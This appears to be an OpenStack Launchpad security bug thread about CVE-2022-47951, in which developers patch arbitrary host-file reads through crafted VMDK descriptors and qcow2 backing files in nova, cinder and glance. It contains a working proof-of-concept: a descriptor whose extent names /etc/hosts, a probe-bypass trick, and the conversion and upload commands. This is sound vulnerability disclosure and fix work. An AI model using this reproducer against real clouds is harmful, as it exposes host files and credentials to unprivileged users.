Unless we're aware of other attacks that can be made by claiming an image is one thing when probing disagrees, we're probably okay for the scope of this bug. My code checks the vmdk rules if we probe it as such, so we won't leak there, even if someone claims it is something else.

I can imagine glance having an enforcement mode that requires images to detect as what they claim to be (it has the infrastructure to make such an enforcement today). Nova could also have a flag that verifies the image's disk\_format agrees with the probe in fetch\_to\_raw().

You know, I really thought we did assert the source type of the image when we fetch it. But looking through all of that, at least as it exists today, I see that we're not. Since the previous requirement for doing that was to protect against the qcow2 backing\_file attack, the comments referencing fetch\_to\_raw() as some sort of safety measure must be referencing the backing\_file check itself.
Unless we're aware of other attacks that can be made by claiming an image is one thing when probing disagrees, we're probably okay for the scope of this bug. My code checks the vmdk rules if we probe it as such, so we won't leak there, even if someone claims it is something else.
I can imagine glance having an enforcement mode that requires images to detect as what they claim to be (it has the infrastructure to make such an enforcement today). Nova could also have a flag that verifies the image's disk\_format agrees with the probe in fetch\_to\_raw().

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Guillaume Espanel (guillaume-espanel)](https://launchpad.net/~guillaume-espanel) wrote on 2022-11-11: |  |  | [#15](/nova/%2Bbug/1996188/comments/15) |
| --- | --- | --- | --- |

I agree, I think we're good for VMDK and I might be worrying too early:

I haven't tested it yet but reading the code it looks like we could convert other less-used formats to raw (qed, or qcow for example). My worry is that qed, for example, is no longer developed and I imagine hasn't been as scrutinized as qcow2 (or vmdk, for that matter).

To be on the safe side, I would further restrict the formats we accept to convert from, but I am not sure to what extend that is feasible.

I agree, I think we're good for VMDK and I might be worrying too early:
I haven't tested it yet but reading the code it looks like we could convert other less-used formats to raw (qed, or qcow for example). My worry is that qed, for example, is no longer developed and I imagine hasn't been as scrutinized as qcow2 (or vmdk, for that matter).
To be on the safe side, I would further restrict the formats we accept to convert from, but I am not sure to what extend that is feasible.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-11: |  |  | [#16](/nova/%2Bbug/1996188/comments/16) |
| --- | --- | --- | --- |

Yes, I think a list of acceptable formats in nova would be a good idea, and a flag in glance to require that an image detects as the format claimed in disk\_format would be good as well.

Yes, I think a list of acceptable formats in nova would be a good idea, and a flag in glance to require that an image detects as the format claimed in disk\_format would be good as well.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-11: |  |  | [#17](/nova/%2Bbug/1996188/comments/17) |
| --- | --- | --- | --- |

* [nova-1996188-2.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5630610/%2Bfiles/nova-1996188-2.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5630610)
  (6.0 KiB,
  text/plain)

Okay, here's the updated nova patch which considers the empty list to mean "none allowed".

Okay, here's the updated nova patch which considers the empty list to mean "none allowed".

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2022-11-12: |  |  | [#18](/nova/%2Bbug/1996188/comments/18) |
| --- | --- | --- | --- |

This affects cinder, too. Attaching a patch based on Dan's nova fix.

This affects cinder, too. Attaching a patch based on Dan's nova fix.

| 1 comments hidden Loading more comments | [view all 189 comments](?comments=all) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2022-11-12: |  |  | [#20](/nova/%2Bbug/1996188/comments/20) |
| --- | --- | --- | --- |

I didn't add Glance because the situation isn't so dire. I believe that an operator must configure the optional image conversion plugin for image import in order for this exploit to affect Glance. That said, I think we should fix it in Glance, too, but waiting to hear what others think before adding Glance to this bug.

I didn't add Glance because the situation isn't so dire. I believe that an operator must configure the optional image conversion plugin for image import in order for this exploit to affect Glance. That said, I think we should fix it in Glance, too, but waiting to hear what others think before adding Glance to this bug.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-14: |  |  | [#21](/nova/%2Bbug/1996188/comments/21) |
| --- | --- | --- | --- |

Hello, thanks for the patch, I think we need to include glance in that bug as well.

Hello, thanks for the patch, I think we need to include glance in that bug as well.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Guillaume Espanel (guillaume-espanel)](https://launchpad.net/~guillaume-espanel) wrote on 2022-11-14: |  |  | [#22](/nova/%2Bbug/1996188/comments/22) |
| --- | --- | --- | --- |

About Cinder, I think we should put the check\_vmdk\_format as close as possible the call to convert.

First, I think we may be missing some convert\_images. I cannot test it, but I have come across this where we seem to convert an image into a volume directly: <https://opendev.org/openstack/cinder/src/branch/master/cinder/volume/drivers/netapp/dataontap/nfs_base.py#L767>

Second, I noted that, in the case of AMI image format, we let qemu-img convert detect the real format of the image:

<https://opendev.org/openstack/cinder/src/branch/master/cinder/image/image_utils.py#L277>

I think this is caught as part of the proposed patch, but there could be similar constructions elsewhere.

Third, in fetch\_to\_volume\_format, we first check the VMDK createType if qemu-img info detects a VMDK, but we call the convert with the format declared in the image metadata.

Importantly, I was able to trick qemu-img info into detecting a "raw" image than can actually be converted from VMDK to raw by simply adding an empty line at the beginning of the file, thus (if I understand correctly) bypassing the check entirely.

Here's a short reproducer, note the empty line before # Disk DescriptorFile :

cat > test.raw << EOF

# Disk DescriptorFile

version=1

CID=86cc8022

parentCID=ffffffff

createType="monolithicFlat"

# Extent description

RW 2048 FLAT "/etc/hosts" 0

# The Disk Data Base

#DDB

ddb.virtualHWVersion = "4"

ddb.geometry.cylinders = "2"

ddb.geometry.heads = "16"

ddb.geometry.sectors = "63"

ddb.adapterType = "ide"

EOF

qemu-img info test.raw

image: test.raw

file format: raw

virtual size: 512 B (512 bytes)

disk size: 4 KiB

qemu-img convert -f vmdk -O raw test.raw hacked.raw

I'll look again at the nova patch to make sure we account for that funny discovery there too.

About glance, I think we should also patch it as part of this effort, even though it's not as bad given the fact the exploit is unavailable by default.

About Cinder, I think we should put the check\_vmdk\_format as close as possible the call to convert.
First, I think we may be missing some convert\_images. I cannot test it, but I have come across this where we seem to convert an image into a volume directly: https://opendev.org/openstack/cinder/src/branch/master/cinder/volume/drivers/netapp/dataontap/nfs\_base.py#L767
Second, I noted that, in the case of AMI image format, we let qemu-img convert detect the real format of the image:
https://opendev.org/openstack/cinder/src/branch/master/cinder/image/image\_utils.py#L277
I think this is caught as part of the proposed patch, but there could be similar constructions elsewhere.
Third, in fetch\_to\_volume\_format, we first check the VMDK createType if qemu-img info detects a VMDK, but we call the convert with the format declared in the image metadata.
Importantly, I was able to trick qemu-img info into detecting a "raw" image than can actually be converted from VMDK to raw by simply adding an empty line at the beginning of the file, thus (if I understand correctly) bypassing the check entirely.
Here's a short reproducer, note the empty line before # Disk DescriptorFile :
cat > test.raw << EOF
# Disk DescriptorFile
version=1
CID=86cc8022
parentCID=ffffffff
createType="monolithicFlat"
# Extent description
RW 2048 FLAT "/etc/hosts" 0
# The Disk Data Base
#DDB
ddb.virtualHWVersion = "4"
ddb.geometry.cylinders = "2"
ddb.geometry.heads = "16"
ddb.geometry.sectors = "63"
ddb.adapterType = "ide"
EOF
qemu-img info test.raw
image: test.raw
file format: raw
virtual size: 512 B (512 bytes)
disk size: 4 KiB
qemu-img convert -f vmdk -O raw test.raw hacked.raw
I'll look again at the nova patch to make sure we account for that funny discovery there too.
About glance, I think we should also patch it as part of this effort, even though it's not as bad given the fact the exploit is unavailable by default.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-14: |  |  | [#23](/nova/%2Bbug/1996188/comments/23) |
| --- | --- | --- | --- |

* [glance-1996188.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5630734/%2Bfiles/glance-1996188.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5630734)
  (6.8 KiB,
  text/plain)

It's not available by default in glance - you have to enable the image\_conversion feature (which enforces that all images get converted to a single specific format). That said, I do also think we should include glance here, especially since I found that the same code is also unpatched against the long-fixed-in-nova/cinder qcow backing\_file attack. Host file exposure to unprivileged users seems like a large enough impact to justify fixing it ASAP.

This patch fixes the vmdk thing just like cinder and nova, and also fixes the similar qemu vulnerability as well.

Perhaps we could loop in another glance person (say Abhi) for his opinion on the patch and including glance specifically. If so, then would just be a formality.

It's not available by default in glance - you have to enable the image\_conversion feature (which enforces that all images get converted to a single specific format). That said, I do also think we should include glance here, especially since I found that the same code is also unpatched against the long-fixed-in-nova/cinder qcow backing\_file attack. Host file exposure to unprivileged users seems like a large enough impact to justify fixing it ASAP.
This patch fixes the vmdk thing just like cinder and nova, and also fixes the similar qemu vulnerability as well.
Perhaps we could loop in another glance person (say Abhi) for his opinion on the patch and including glance specifically. If so, then would just be a formality.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2022-11-14: |  |  | [#24](/nova/%2Bbug/1996188/comments/24) |
| --- | --- | --- | --- |

Yes, a number of public clouds I interact with apply the image conversion task to uploads, so while it may be optional I expect the impact is still fairly widespread.

Yes, a number of public clouds I interact with apply the image conversion task to uploads, so while it may be optional I expect the impact is still fairly widespread.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2022-11-14: |  |  | [#25](/nova/%2Bbug/1996188/comments/25) |
| --- | --- | --- | --- |

Latest version of cinder patch hardens the check function a bit and adds another test; still looking into what Guillaume mentioned on his earlier comment

Latest version of cinder patch hardens the check function a bit and adds another test; still looking into what Guillaume mentioned on his earlier comment

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Guillaume Espanel (guillaume-espanel)](https://launchpad.net/~guillaume-espanel) wrote on 2022-11-16: |  |  | [#26](/nova/%2Bbug/1996188/comments/26) |
| --- | --- | --- | --- |

I keep thinking we should move the check\_vmdk\_image (and possibly duplicate the image inspection) as close as possible to the actual convert.

Hopefully exhaustive list of places where we I think we should perform the check:

- For nova, in virt.images.\_convert\_image()

- For glance, in async\_.flows.convert.\_Convert.execute() and async\_.flows.plugins.image\_conversion.\_ConvertImage.\_execute()

- For cinder, in image.image\_utils.\_convert\_image()

In addition, I think we should never run qemu-img convert without a "-f something" argument. We are doing this at least for AMIs (they can be either qcow2 or raw IIRC) and LVM. In such cases I suggest we run qemu-img info to determine the format of the source and pass the inspected format to convert (after running the checks), instead of letting qemu-img convert detect it, thus bypassing the checks.

I keep thinking we should move the check\_vmdk\_image (and possibly duplicate the image inspection) as close as possible to the actual convert.
Hopefully exhaustive list of places where we I think we should perform the check:
- For nova, in virt.images.\_convert\_image()
- For glance, in async\_.flows.convert.\_Convert.execute() and async\_.flows.plugins.image\_conversion.\_ConvertImage.\_execute()
- For cinder, in image.image\_utils.\_convert\_image()
In addition, I think we should never run qemu-img convert without a "-f something" argument. We are doing this at least for AMIs (they can be either qcow2 or raw IIRC) and LVM. In such cases I suggest we run qemu-img info to determine the format of the source and pass the inspected format to convert (after running the checks), instead of letting qemu-img convert detect it, thus bypassing the checks.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-16: |  |  | [#27](/nova/%2Bbug/1996188/comments/27) |
| --- | --- | --- | --- |

Why do you think that? Doing checks upfront in fetch\_image\_to\_raw (for the nova case) makes the most sense to me, and it matches where we do the check for the qcow backing file. IMHO, it's best to just check and reject immediately, before we do any other inspection or potential work.

IMHO, convert\_image() is an "internal" method that just does what we ask it to, and it already requires source and destination formats. We need to be suspicious of images when we pull the from glance, but after we've internalized them I don't think we need to do that check every time we're handling an image.

Why do you think that? Doing checks upfront in fetch\_image\_to\_raw (for the nova case) makes the most sense to me, and it matches where we do the check for the qcow backing file. IMHO, it's best to just check and reject immediately, before we do any other inspection or potential work.
IMHO, convert\_image() is an "internal" method that just does what we ask it to, and it already requires source and destination formats. We need to be suspicious of images when we pull the from glance, but after we've internalized them I don't think we need to do that check every time we're handling an image.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Guillaume Espanel (guillaume-espanel)](https://launchpad.net/~guillaume-espanel) wrote on 2022-11-16: |  |  | [#28](/nova/%2Bbug/1996188/comments/28) |
| --- | --- | --- | --- |

Focusing on nova, we seem to be going through fetch\_to\_raw most of the time.

I am a bit suspicious of the convert\_image\_unsafe because it is not entirely clear to me how we end-up calling it, but if we believe the comments, it should either run on a fetch'd\_to\_raw image, or on a locally generated image. If we are confident this is true and is likely to remain true, we're probably good.

Regarding glance, I think we are already following the right approach, but unless I am missing something, we have to add the same patch you did in async\_.flows.plugins.image\_conversion.\_ConvertImage.\_execute() in async\_.flows.convert.\_Convert.execute().

Finally, in cinder, convert\_image has callers in many different places (in the drivers for example), and it could be easy to miss an unsafe call there.

Overall, I agree it would be nice to check and reject early, but for me it'd be nicer to provide convert\_image functions that are safe (at least from this bug) by default. I could imagine, sometime in the future, someone using one of these convert\_image functions without checking their VMDK is of this or that createType.

Focusing on nova, we seem to be going through fetch\_to\_raw most of the time.
I am a bit suspicious of the convert\_image\_unsafe because it is not entirely clear to me how we end-up calling it, but if we believe the comments, it should either run on a fetch'd\_to\_raw image, or on a locally generated image. If we are confident this is true and is likely to remain true, we're probably good.
Regarding glance, I think we are already following the right approach, but unless I am missing something, we have to add the same patch you did in async\_.flows.plugins.image\_conversion.\_ConvertImage.\_execute() in async\_.flows.convert.\_Convert.execute().
Finally, in cinder, convert\_image has callers in many different places (in the drivers for example), and it could be easy to miss an unsafe call there.
Overall, I agree it would be nice to check and reject early, but for me it'd be nicer to provide convert\_image functions that are safe (at least from this bug) by default. I could imagine, sometime in the future, someone using one of these convert\_image functions without checking their VMDK is of this or that createType.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-16: |  |  | [#29](/nova/%2Bbug/1996188/comments/29) |
| --- | --- | --- | --- |

Cool on Nova. On Glance, TBH, I'm not sure how users access the other flow. The one I patched is used on import, but I'm not sure how those legacy plugins ever get called. Perhaps Brian can comment. Certainly it's possible to just patch that the same way, but we should be deliberate about it.

Cool on Nova. On Glance, TBH, I'm not sure how users access the other flow. The one I patched is used on import, but I'm not sure how those legacy plugins ever get called. Perhaps Brian can comment. Certainly it's possible to just patch that the same way, but we should be deliberate about it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2022-11-16: |  |  | [#30](/nova/%2Bbug/1996188/comments/30) |
| --- | --- | --- | --- |

@Dan: that's a good question about the glance legacy plugins. I don't remember why Erno needed to introduce new ones for the Interoperable Image Import workflow. They're left over from the old tasks API, which I guess can still be activated by directly creating a task, so they're not dead code. We'll need to check with Abhishek or Erno about whether the same technique can be used to patch it (I think it can). I'm not sure what the status of the Tasks API is with respect to being completely removed.

@Guillaume: I'm looking at moving the checks in cinder to convert\_image() without causing regressions. Can probably do it for this vmdk issue, but not the backing\_file.

@Dan: that's a good question about the glance legacy plugins. I don't remember why Erno needed to introduce new ones for the Interoperable Image Import workflow. They're left over from the old tasks API, which I guess can still be activated by directly creating a task, so they're not dead code. We'll need to check with Abhishek or Erno about whether the same technique can be used to patch it (I think it can). I'm not sure what the status of the Tasks API is with respect to being completely removed.
@Guillaume: I'm looking at moving the checks in cinder to convert\_image() without causing regressions. Can probably do it for this vmdk issue, but not the backing\_file.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-17: |  |  | [#31](/nova/%2Bbug/1996188/comments/31) |
| --- | --- | --- | --- |

Yeah, task creation is locked down to admin-only now (and have been for a while, AFAIK) so I don't think this is likely exploitable by a regular user. That, and I'm not even sure how you configure (or request) conversion via that mechanism. Anyway, I can update the patch to just do the same thing for it, but I won't be able to test it, other than unit tests in the tree that I find (which may not exist). But, if you think it's worth updating that one too, I will.

Yeah, task creation is locked down to admin-only now (and have been for a while, AFAIK) so I don't think this is likely exploitable by a regular user. That, and I'm not even sure how you configure (or request) conversion via that mechanism. Anyway, I can update the patch to just do the same thing for it, but I won't be able to test it, other than unit tests in the tree that I find (which may not exist). But, if you think it's worth updating that one too, I will.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2022-11-17: |  |  | [#32](/nova/%2Bbug/1996188/comments/32) |
| --- | --- | --- | --- |

If nothing else, it may serve as a stronger reminder to anyone backporting to very old releases that they need to take care of fixing it there.

If nothing else, it may serve as a stronger reminder to anyone backporting to very old releases that they need to take care of fixing it there.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-18: |  |  | [#33](/nova/%2Bbug/1996188/comments/33) |
| --- | --- | --- | --- |

* [glance-1996188-2.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5631413/%2Bfiles/glance-1996188-2.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5631413)
  (13.4 KiB,
  text/plain)

Okay, rev2 of the glance patch with the legacy import task patched and those tests updated as well. I'm not sure if/when this was ever used, so I'm not sure how important of an indicator it will be to people backporting to kilo or something ancient, but here it is.

Okay, rev2 of the glance patch with the legacy import task patched and those tests updated as well. I'm not sure if/when this was ever used, so I'm not sure how important of an indicator it will be to people backporting to kilo or something ancient, but here it is.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-23: |  |  | [#34](/nova/%2Bbug/1996188/comments/34) |
| --- | --- | --- | --- |

Hello,

FYI, we mitigated this on our infra by completely disabling the vmdk convertion. Like guillaume explained, we did that directly in the \_convert method.

Anyway, the glance patch looks good.

What are the next steps?

Hello,
FYI, we mitigated this on our infra by completely disabling the vmdk convertion. Like guillaume explained, we did that directly in the \_convert method.
Anyway, the glance patch looks good.
What are the next steps?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-23: |  |  | [#35](/nova/%2Bbug/1996188/comments/35) |
| --- | --- | --- | --- |

Just to let you know that glance is affected by the bug with the import plugin.

A user can trigger the conversion if the operator enabled this in the config:

[image\_import\_opts]

image\_import\_plugins = ['image\_conversion']

Then, as a regular user:

openstack image create --file leak.qcow --disk-format qcow2 --import leak9.qcow

Will test the patch to make sure this is mitigating the issue now

Just to let you know that glance is affected by the bug with the import plugin.
A user can trigger the conversion if the operator enabled this in the config:
[image\_import\_opts]
image\_import\_plugins = ['image\_conversion']
Then, as a regular user:
openstack image create --file leak.qcow --disk-format qcow2 --import leak9.qcow
Will test the patch to make sure this is mitigating the issue now

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-23: |  |  | [#36](/nova/%2Bbug/1996188/comments/36) |
| --- | --- | --- | --- |

I did test the glance patch. It works (mitigate both qcow and vmdk, with import taskflow).

One note, during the convert process, the qemu-img info is executed.

Something like this:

qemu-img info --output=json /tmp/staging/7b7b34b1-332c-4257-8a19-b9ff71bfe2c5

If the backing file does not exists, it fails with:

"qemu-img: Could not open '/tmp/staging/7b7b34b1-332c-4257-8a19-b9ff71bfe2c5': Could not open '/etc/nova/nova.conf': No such file or directory\n"

Leaving the image in "importing" state.

This is wrong IMO and should be catched as an invalid type, what do you think?

I did test the glance patch. It works (mitigate both qcow and vmdk, with import taskflow).
One note, during the convert process, the qemu-img info is executed.
Something like this:
qemu-img info --output=json /tmp/staging/7b7b34b1-332c-4257-8a19-b9ff71bfe2c5
If the backing file does not exists, it fails with:
"qemu-img: Could not open '/tmp/staging/7b7b34b1-332c-4257-8a19-b9ff71bfe2c5': Could not open '/etc/nova/nova.conf': No such file or directory\n"
Leaving the image in "importing" state.
This is wrong IMO and should be catched as an invalid type, what do you think?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-23: |  |  | [#37](/nova/%2Bbug/1996188/comments/37) |
| --- | --- | --- | --- |

Another thing,

are we sure VMDK and QCOW formats are the only formats allowing backing files?

Another thing,
are we sure VMDK and QCOW formats are the only formats allowing backing files?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2022-11-23: |  |  | [#38](/nova/%2Bbug/1996188/comments/38) |
| --- | --- | --- | --- |

Assuming we have answers to your other questions, and Cinder/Glance/Nova security reviewers confirm they're comfortable with the proposed master branch patches and expect them to be safely backportable to maintained stable branches of their respective projects, I'll start drafting an impact statement to use in requesting a private CVE assignment and for inclusion in embargoed downstream stakeholder notifications (and eventually in a corresponding security advisory publication).

Once we have a CVE assignment and backports attached for each project's patch, we should be ready to schedule the advisory publication and provide advance copies of those patches to the downstream stakeholders.

Assuming we have answers to your other questions, and Cinder/Glance/Nova security reviewers confirm they're comfortable with the proposed master branch patches and expect them to be safely backportable to maintained stable branches of their respective projects, I'll start drafting an impact statement to use in requesting a private CVE assignment and for inclusion in embargoed downstream stakeholder notifications (and eventually in a corresponding security advisory publication).
Once we have a CVE assignment and backports attached for each project's patch, we should be ready to schedule the advisory publication and provide advance copies of those patches to the downstream stakeholders.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2022-11-23: |  |  | [#39](/nova/%2Bbug/1996188/comments/39) |
| --- | --- | --- | --- |

Revised patch posted in case anyone has time to look over Thanksgiving. This is not the final version. I had to move some code around because we weren't checking the format info for a image with container\_format==compressed correctly (qemu-img info was being run on the gzip'd file, which would always report itself as 'raw' format. Also added a check to make sure the disk\_format and what cinder detects as the image format matches, which I think is correct, but which may make some previously successful requests to create a volume from a source image to now fail.

Revised patch posted in case anyone has time to look over Thanksgiving. This is not the final version. I had to move some code around because we weren't checking the format info for a image with container\_format==compressed correctly (qemu-img info was being run on the gzip'd file, which would always report itself as 'raw' format. Also added a check to make sure the disk\_format and what cinder detects as the image format matches, which I think is correct, but which may make some previously successful requests to create a volume from a source image to now fail.

[Jeremy Stanley (fungi)](https://launchpad.net/~fungi)
on 2022-12-19

| Changed in ossa: | |
| --- | --- |
| **status**: | Incomplete → Confirmed |
| **importance**: | Undecided → High |
| **assignee**: | nobody → Jeremy Stanley (fungi) |

[Jeremy Stanley (fungi)](https://launchpad.net/~fungi)
on 2022-12-24

| Changed in ossa: | |
| --- | --- |
| **status**: | Confirmed → In Progress |

[Jeremy Stanley (fungi)](https://launchpad.net/~fungi)
on 2022-12-25

| **summary**: | Arbitrary file access through custom VMDK flat descriptor+ (CVE-2022-47951) |
| --- | --- |

[Jeremy Stanley (fungi)](https://launchpad.net/~fungi)
on 2023-01-17

| Changed in ossa: | |
| --- | --- |
| **status**: | In Progress → Fix Committed |

[Jeremy Stanley (fungi)](https://launchpad.net/~fungi)
on 2023-01-24

| **description**: | updated |
| --- | --- |
| **information type**: | Private Security → Public Security |

[OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack)
on 2023-01-24

| Changed in glance: | |
| --- | --- |
| **status**: | New → In Progress |
| Changed in cinder: | |
| **status**: | New → In Progress |

[Jeremy Stanley (fungi)](https://launchpad.net/~fungi)
on 2023-01-24

| **summary**: | - Arbitrary file access through custom VMDK flat descriptor- (CVE-2022-47951)+ [OSSA-2023-002] Arbitrary file access through custom VMDK flat+ descriptor (CVE-2022-47951) |
| --- | --- |

[OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack)
on 2023-01-24

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

[OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack)
on 2023-01-24

| Changed in glance: | |
| --- | --- |
| **status**: | In Progress → Fix Released |

[OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack)
on 2023-01-24

| **tags**: | added: in-stable-zed |
| --- | --- |

[OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack)
on 2023-01-25

| **tags**: | added: in-stable-yoga |
| --- | --- |

| 110 comments hidden Loading more comments | [view all 189 comments](?comments=all) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Related fix proposed to nova (stable/ussuri)**](/nova/%2Bbug/1996188/comments/150) |  |  | [#150](/nova/%2Bbug/1996188/comments/150) |
| --- | --- | --- | --- |

Related fix proposed to branch: stable/ussuri

Review: [https://review.opendev.org/c/openstack/nova/+/871702](https://review.opendev.org/c/openstack/nova/%2B/871702)

Related fix proposed to branch: stable/ussuri
Review: https://review.opendev.org/c/openstack/nova/+/871702

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Rohmann (christian-rohmann)](https://launchpad.net/~christian-rohmann) wrote on 2023-01-25: |  |  | [#151](/nova/%2Bbug/1996188/comments/151) |
| --- | --- | --- | --- |

Jeremy there still seem to be no updated packages on UCA (Ubuntu Cloud Archive) - <https://openstack-ci-reports.ubuntu.com/reports/cloud-archive/xena_versions.html>, <https://openstack-ci-reports.ubuntu.com/reports/cloud-archive/yoga_versions.html>, ...

I highly doubt there will be any without an SRU. Take this (my) recent bug as an example:

[https://bugs.launchpad.net/cloud-archive/+bug/1995861](https://bugs.launchpad.net/cloud-archive/%2Bbug/1995861)

stable/xyz already has the fix, there was a release made, but no package updates were triggerd.

Jeremy there still seem to be no updated packages on UCA (Ubuntu Cloud Archive) - https://openstack-ci-reports.ubuntu.com/reports/cloud-archive/xena\_versions.html, https://openstack-ci-reports.ubuntu.com/reports/cloud-archive/yoga\_versions.html, ...
I highly doubt there will be any without an SRU. Take this (my) recent bug as an example:
https://bugs.launchpad.net/cloud-archive/+bug/1995861
stable/xyz already has the fix, there was a release made, but no package updates were triggerd.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Fix merged to glance (stable/zed)**](/nova/%2Bbug/1996188/comments/152) |  |  | [#152](/nova/%2Bbug/1996188/comments/152) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/glance/+/871614](https://review.opendev.org/c/openstack/glance/%2B/871614)

Committed: <https://opendev.org/openstack/glance/commit/4967ab6935cfd0274ae801ac943d01909a236a0a>

Submitter: "Zuul (22348)"

Branch: stable/zed

commit 4967ab6935cfd0274ae801ac943d01909a236a0a

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

Reviewed: https://review.opendev.org/c/openstack/glance/+/871614
Committed: https://opendev.org/openstack/glance/commit/4967ab6935cfd0274ae801ac943d01909a236a0a
Submitter: "Zuul (22348)"
Branch: stable/zed
commit 4967ab6935cfd0274ae801ac943d01909a236a0a
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Fix merged to glance (stable/yoga)**](/nova/%2Bbug/1996188/comments/153) |  |  | [#153](/nova/%2Bbug/1996188/comments/153) |
| --- | --- | --- | --- |

